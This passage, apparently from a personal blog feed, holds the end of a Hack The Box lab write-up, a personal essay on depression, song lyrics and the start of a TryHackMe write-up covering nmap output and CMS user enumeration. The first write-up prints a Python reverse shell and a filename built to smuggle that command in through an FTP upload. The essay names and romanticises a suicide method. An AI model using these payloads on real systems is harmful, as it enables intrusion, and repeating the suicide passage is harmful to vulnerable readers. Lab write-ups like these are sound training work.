Bash commands were not suitable for this coz of being executed before even attempting to run them, and it the idea was to craft a malicious payload that will be a name of empty file that we will upload to pwnmeow user’s ftp as we got his credentials previously.
Other thing was to create a temporary file that has our payload which we can then execute by calling its full path, tho the issue is that we cannot create filename’s as a path , which left us we fewer options.
Since Python was available, we can use a oneliner reverse shell as our payload , tho it had to be really perfect specially with escaping double quotes.
I Used the following oneliner reverse shell&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.210&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(&quot;sh&quot;);'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After Editing it to escape double quotes and create an empty file&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;/span&gt;\&lt;span class=&quot;s&quot;&gt;&quot;10.10.14.210&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;';.csv&quot;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Then we go back to ftp and upload it, &lt;strong&gt;ONE BIG FAT WARNING&lt;/strong&gt; If you tried to upload the file to the root folder, it will not work and file will not be uploaded, and you’ll get really frustrated on why not it didn’t work like myself lol.
Choose any folder , it doesn’t matter which one and upload it to it .
&lt;img src=&quot;https://ybenel.cf/imgs/pikaboo/ftp_upload.png&quot; alt=&quot;img&quot; /&gt;
&lt;strong&gt;Notice&lt;/strong&gt; in ur listener it will first connect back from ur machine , kill it immediately and re-run your listener, After few seconds
You’ll receive a
&lt;img src=&quot;https://ybenel.cf/imgs/pikaboo/root_flag.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="HTB" /><category term="HTB" /><category term="Hard" /><category term="Logs" /><category term="LFI" /><category term="Poisoning" /><category term="Misconfigurations" /><summary type="html">A Hard Machine That Consist On Exploiting MisConfigurations</summary></entry><entry><title type="html">The Pre Sequal</title><link href="/presequal/2021/09/07/Pre-Sequal.html" rel="alternate" type="text/html" title="The Pre Sequal" /><published>2021-09-07T00:00:00+01:00</published><updated>2021-09-07T00:00:00+01:00</updated><id>/presequal/2021/09/07/Pre-Sequal</id><content type="html" xml:base="/presequal/2021/09/07/Pre-Sequal.html">&lt;h3 id=&quot;suicide-spaceship&quot;&gt;Suicide Spaceship.&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;To be honest i don't even know from where to start .
This is a sequel with no story but with aligned splash of eternal pain
I've been looking to fulfill my destiny which turned into a dark way
The Amount of pain that is caused is beyond what i can handle
   
when hearing about mental disorders, I'd laugh about it
but never realized i might get it or had it myself
It eats you slowly from deep inside just like cancer
yet it is worst than cancer, cause there's a slightly chance slim to none

you'll get back recovered as some disorders are lifetime :(
it begins when you start by your willingness disconnecting from the world around you
Creating an isolating environment for yourself only .
As my younger self , i had plenty of close friends which i used to hang out with all the time
And i mean like a lot, we are still friends but not like we used to be
it has been so long since I've hanged out or meet any of them we barely even talk

Well i barely i guess, and it is not just friends, even Ur own family
I've tried so hard to avoid my own family , i don't talk that much only when i have to
I avoid occasions special events , family meet ups . as it is a natural necessary action
by reaching this state, Ur mind and body just flows inside of an infinite maze with no way out
yourself becomes another entity , and you wouldn't believe what can u do.
Your conscience will start acting on its own and you'll have no control over it,
when feeling danger of exposing your sense, it lies to cover up its state and gets violent when being pushed.
You start living a lie believing in something that never happened and ensuring yourself that you're good and doing the right thing.

After yourself is locked away you'll be anti-social and facing post traumatic disorder, stress and anxiety start kicking .
your chest will start getting heavier feeling burnout from inside and that's where pain takes its place , it feels like putting a ton of weight on Ur chest and cannot stand up
you'll start thinking about cutting Ur chest open and left out the weight , and yes that is suicidal thoughts
I've had so many suicidal thoughts and how to achieve them , one of the easier ways is just by jumping off a building .
Feeling the hair blows on Ur face while enjoying Ur last moment in peace before dying.
Crying is another thing, you cry randomly with no reason which is another mental condition caused by stress, deep depressing and more awful things.
Feeling guilt for your own self , it shows how deeply you're affected . one thing good about crying is that u feel less bad and stressed but not that much
i cry at anytime and absolutely i do hide it , nobody sees and no one should or find out .

When being out for extreme condition, communicating is really hard after being anti-social and never talking with anybody took out some skills.
fun fact, even simple words don't wanna come out of your mouth, being speechless and your voice also changes it becomes less heard .
when being in isolation, you think you aren't hurting or disrupting while in most cases u doing more damage than u could .
i don't blame people who hated me either for lying or some way indirectly , i can't say i can control the way things goes I'm tied up.
Drifting away in an infinite loop for no purpose.
As Mental illness is no joke, i feel drowning in my left lifespan hoping someone catches my hand and pull me out of the misery I'm in , there's only 2 ways either i kill it or it kills me 
Tip: Do not hesitate getting treatment ASAP , don't be like me I've ignored it too much and its now killing me slow :)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="PreSequal" /><category term="PreSequal" /><category term="Beginning" /><category term="Psychology" /><category term="Disorder" /><category term="Illness" /><summary type="html">Suicide Spaceship.</summary></entry><entry><title type="html">The End</title><link href="/theend/2021/08/27/Suicide.html" rel="alternate" type="text/html" title="The End" /><published>2021-08-27T00:00:00+01:00</published><updated>2021-08-27T00:00:00+01:00</updated><id>/theend/2021/08/27/Suicide</id><content type="html" xml:base="/theend/2021/08/27/Suicide.html">&lt;h3 id=&quot;lyrics-dedicated-to-those-whove-done-enough&quot;&gt;Lyrics Dedicated To Those Who’ve Done Enough.&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I've always kept wondering what's with me .
I have been through the nether
I don't know how i survived
Messing my life, changing like the tides
   
I thought i could look past all these mistakes
but with no time to play games, my hearts could break
It was never gonna last, gone before you wake
I was moving i was shaking trying to fade away.
Had my mind all in the clouds, did i die today ?

Had to sit back, count my messes
Cause it always had me stressing
And it play with my emotions
Had me so high I was floating

Looking beyond the truth
thinking i'm getting used
Blink back to my youth, i need a new groove
Lying, cause I know she'll disapprove
How I'm flying so high, it's just me and you
Can't tell by the red eyes, it was something new
Nowadays it's the only thing we ever wanna do
Our demise so true when the lies be coming true.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="TheEnd" /><category term="TheEnd" /><summary type="html">Lyrics Dedicated To Those Who’ve Done Enough.</summary></entry><entry><title type="html">THM - CMSpit</title><link href="/thm/2021/08/05/THM-CMSpit.html" rel="alternate" type="text/html" title="THM - CMSpit" /><published>2021-08-05T00:00:00+01:00</published><updated>2021-08-05T00:00:00+01:00</updated><id>/thm/2021/08/05/THM-CMSpit</id><content type="html" xml:base="/thm/2021/08/05/THM-CMSpit.html">&lt;p&gt;CMSpit Is a medium linux machine that consist of identifying vulnerabilties related to web CMS framework that includes information gathering,user enumeration,privilege escalation.&lt;/p&gt;

&lt;h2 id=&quot;cms-enumeration&quot;&gt;CMS Enumeration&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;As always we start of with nmap to see what ports are open.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;cp&quot;&gt;# Nmap 7.91 scan initiated Mon Aug  2 17:33:54 2021 as: nmap -sC -sV -oN initial.nmap 10.10.103.27
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Nmap&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scan&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;10.10.103.27&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;up&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mx&quot;&gt;0.64s&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;latency&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shown&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;998&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;closed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;STATE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SERVICE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VERSION&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ssh&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;OpenSSH&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;7.2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Ubuntu&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4u&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buntu2&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ubuntu&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Linux&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protocol&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hostkey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;82&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e4&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ECDSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mx&quot;&gt;5d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ED25519&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;Apache&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpd&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.4.18&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ubuntu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Apache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.4.18&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ubuntu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Authenticate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Please&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_Requested&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;was&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=/&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trane&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Problem&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;XML&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parsing&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evox&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;about&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Service&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Linux&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CPE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cpe&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;linux_kernel&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;there’s 2 ports open , first is &lt;strong&gt;ssh&lt;/strong&gt; and the second one is &lt;strong&gt;http&lt;/strong&gt; running apache in a ubuntu machine.&lt;/li&gt;
  &lt;li&gt;Going over to http://10.10.103.27 we can see it’s hosting &lt;strong&gt;Cockpit&lt;/strong&gt; CMS.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/http_80.png&quot; alt=&quot;http_80&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Trying common default login credentials such as “admin:admin”,”admin:password” doesn’t work .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/failed_attempt.png&quot; alt=&quot;failed_attempt&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Next we enumerate further the CMS, checking first its login page source which reveals its version .
&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/version_leak.png&quot; alt=&quot;version_leak&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Heading over to google , it looks like Cockpit suffers from NoSql Injection and remote code execution which is a breaking deal, and even it has msf module written for it so u could just fire up msf and there u go straight to RCE (we will get to that later).&lt;/li&gt;
  &lt;li&gt;Also we see how we can enumeration users in two different ways .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/cockpit_vulne.png&quot; alt=&quot;cockpit_vulne&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;user-enumeration&quot;&gt;User Enumeration&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;First Method&lt;/strong&gt; /auth/forgotpassword Offers an easy way to enumerate users, however doing it manually is quite takes alot of effort and time .&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Specifying a none existing user will result into the following&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/user_enum_failed.png&quot; alt=&quot;user_enum_failed&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;While Specifying a user that exists results into the following&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cmspit/user_enum_success.png&quot; alt=&quot;user_enum_success&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;You can script it to do the whole work for u.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Second Method&lt;/strong&gt; Is by using /auth/requestreset and set the data to&lt;/p&gt;

